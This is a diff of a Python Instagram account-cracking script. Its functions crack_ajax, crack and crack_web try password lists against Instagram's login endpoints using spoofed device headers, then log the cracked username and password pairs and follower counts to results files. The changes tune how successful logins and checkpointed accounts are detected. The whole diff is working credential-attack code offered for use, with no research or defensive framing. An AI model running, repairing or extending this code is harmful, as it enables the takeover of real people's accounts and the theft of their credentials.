@@ -482,7 +482,7 @@ def Password(name):
 
 def crack_ajax(username, memek):
 	global Ok, Cp, Loop
-	prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uuid))} ] True [ {Ok} ] False [ {Cp} ')
+	prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uuid))} ] True [ {Ok} ] False [ {Cp} ]')
 	prog.advance(des)
 	for password in memek:
 		try:
@@ -529,16 +529,8 @@ def crack_ajax(username, memek):
 			ses.headers.update(headers)
 			data = (f'params=%7B %22client_input_params%22%3A%7B%22device_id%22%3A%22{device_id}%22%2C%22name%22%3A%22{username}%22%2C%22machine_id%22%3A%22{str(uuid.uuid4())}%22%2C%22contact_point%22%3A%22{username}%22%2C%22encrypted_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{round(time.time())}%3A{password}%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%229fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a')
 			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=data, allow_redirects=True)
-			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
-				try:
-					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
-					try:
-						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
-						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
-					except Exception as e:
-						cookies = ('-')
-				except Exception as e:
-					ig_set_authorization = (None)
+			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
+				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
 				Ok += 1
 				post, peng, meng,fullname= data_target(username)
 				print(f"                                                                ", end='\r')
@@ -546,11 +538,11 @@ def crack_ajax(username, memek):
 				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
 				tree.add(Panel.fit(f"{P2}Username : {H2}{username}")).add(Panel.fit(f"{P2}Password : {H2}{password}"))
 				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
-				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{cookies}{P2}"))
+				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{P2}"))
 				prints(tree)
 				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
 				break
-			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
+			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
 				Cp += 1
 				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
 				print(f"                                                                ", end='\r')
@@ -569,7 +561,7 @@ def crack_ajax(username, memek):
 
 def crack(username, memek):
 	global Ok, Cp, Loop
-	prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uuid))} ] True [ {Ok} ] False [ {Cp} ')
+	prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uuid))} ] True [ {Ok} ] False [ {Cp} ]')
 	prog.advance(des)
 	ua = UserAgentBarcelona()
 	try:
@@ -605,8 +597,8 @@ def crack(username, memek):
 			'x-fb-client-ip': 'True',
 			'x-fb-server-cluster': 'True',}
 			data = { 'params': '{"client_input_params":{"sim_phones":[],"secure_family_device_id":"","has_granted_read_contacts_permissions":0,"auth_secure_device_id":"","has_whatsapp_installed":1,"password":"#PWD_INSTAGRAM:1:1737314464:ASmiO0H7KO1lSHSVLD4AAQ3yHOQtKVKRpdR9yFhIWqJBeBbEU0j4wP4eOahNGtbiKFgOkryTbdkyXMwor2BGxPCFKqhVRPfvep+5uYSZc53mPuNRjARGXsbBynHu58rfFwQHRgLY8INiapNvRMXZn14V9v0xpXKxF1n1pifhwXW8OpBNYwIt1kFhG+vgfvxy1pqNilFCVJzc/VQv40JpeiMWbSUWLc9gYtk40puaMa29HL9sNNRrxUaYXvadsde+pq+UAt1/v/8a1ky7vpJOyTQHRWE4GBG8VDM+1b6VBtkVVQtvB7Navi3WqF5ZLNSUIYrs3/X5zhvd0iJvnx/TyCOt4hlx3/0PUSvCs7sL+SUA4IvzTOytT/TPdcWNXWv/CzVlxm9Amire","sso_token_map_json_string":"","event_flow":"login_manual","password_contains_non_ascii":"false","client_known_key_hash":"","encrypted_msisdn":"","has_granted_read_phone_permissions":0,"app_manager_id":"","should_show_nested_nta_from_aymh":0,"device_id":"android-4aca695260085376","login_attempt_count":1,"machine_id":"Z41QZgABAAGl-Npk5VnhNYc3iUZx","accounts_list":[],"family_device_id":"60fd63ef-ca7f-4871-8ad1-1e1d93f3247a","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":""},"event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"contact_point":"dogimy3@gmail.com"},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":"b8bc9d1b-ff19-45de-8621-66b300a34492","login_source":"Login","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"offline_experiment_group":"caa_iteration_v3_perf_ig_4","is_from_landing_page":0,"password_text_input_id":"672j8:70","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","username_text_input_id":"672j8:69","layered_homepage_experiment_group":null,"device_id":"android-4aca695260085376","INTERNAL__latency_qpl_instance_id":1.040757200224E12,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":0,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":"60fd63ef-ca7f-4871-8ad1-1e1d93f3247a","is_from_assistive_id":0,"access_flow_version":"F2_FLOW","is_from_logged_in_switcher":0}}','bk_client_context': '{"bloks_version":"5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73","styles_id":"instagram"}', 'bloks_versioning_id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',}
-			response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', headers=headers,data=data,)
-			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
+			response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', headers=headers,data=data, allow_redirects=True)
+			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
 				Ok += 1
 				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentBarcelona(),"x-ig-app-id":'936619743392459'})
 				x_jason = x.json()["data"]["user"]
@@ -621,7 +613,7 @@ def crack(username, memek):
 				prints(tree)
 				open(f"result/success-yow.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
 				break
-			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
+			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
 				Cp += 1
 				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentBarcelona(),"x-ig-app-id":'936619743392459'})
 				x_jason = x.json()["data"]["user"]
@@ -644,12 +636,11 @@ def crack(username, memek):
 
 def crack_web(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uid))} ] Success [ {Ok} ] Failed [ {Cp} ]"),
-    sys.stdout.flush()
+    prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uuid))} ] True [ {Ok} ] False [ {Cp} ]')
+    prog.advance(des)
     ua = Barcelona()
     try:
         for pw in memek:
-            p = ses.get('https://i.instagram.com/accounts/login/')
             headers = {
                 'Host': 'i.instagram.com',
                 "accept": "*/*",
@@ -657,7 +648,6 @@ def crack_web(username, memek):
                 "accept-language": "en-US,en;q=0.9",
                 "content-length": "341",
                 "content-type": "application/x-www-form-urlencoded",
-                "cookie": ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()]),
                 "origin": "https://i.instagram.com",
                 "priority": "u=1, i",
                 "referer": "https://i.instagram.com/",
@@ -673,7 +663,6 @@ def crack_web(username, memek):
                 "sec-fetch-site": "same-origin",
                 "user-agent": ua,
                 "x-asbd-id": "129477",
-                "x-csrftoken": p.cookies['csrftoken'],
                 "x-ig-app-id": "936619743392459",
                 "x-ig-www-claim": "hmac.AR1_zlnbQ-tLPIQXKlawjz9TXzhnOebh4itdoaVG5GdwAHNm",
                 "x-instagram-ajax": "1019724709",
@@ -689,8 +678,8 @@ def crack_web(username, memek):
                 'trustedDeviceRecords': '{}',
                 'username': username
             }
-            response = ses.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers,data=data,)
-            if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or 'https://www.instagram.com/accounts/onetap/?next=%2F' in str(response.text.replace('\\', '')):
+            response = ses.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers,data=data, allow_redirects=True)
+            if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
                 Ok += 1
                 x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentBarcelona(),"x-ig-app-id":'936619743392459'})
                 x_jason = x.json()["data"]["user"]
@@ -705,7 +694,7 @@ def crack_web(username, memek):
                 prints(tree)
                 open(f"result/success-yow.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
                 break
-            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
+            elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                 Cp += 1
                 x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentBarcelona(),"x-ig-app-id":'936619743392459'})
                 x_jason = x.json()["data"]["user"]
